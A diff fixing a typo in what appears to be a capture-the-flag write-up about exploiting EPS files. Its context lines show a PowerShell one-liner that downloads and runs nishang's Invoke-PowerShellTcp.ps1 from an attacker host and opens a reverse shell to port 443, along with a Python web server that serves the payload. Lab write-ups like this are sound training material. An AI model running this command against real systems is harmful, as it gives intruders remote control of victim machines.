@@ -365,7 +365,7 @@ Looking deeper into eps files i found the following publicly known exploit on [g
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.184/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.184 -Port 443
 ```
 
-The payload makes use of the **Invoke-PowerShellTcp.ps1** scripy of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python.
+The payload makes use of the **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python.
 
 ```
 python -m http.server 80
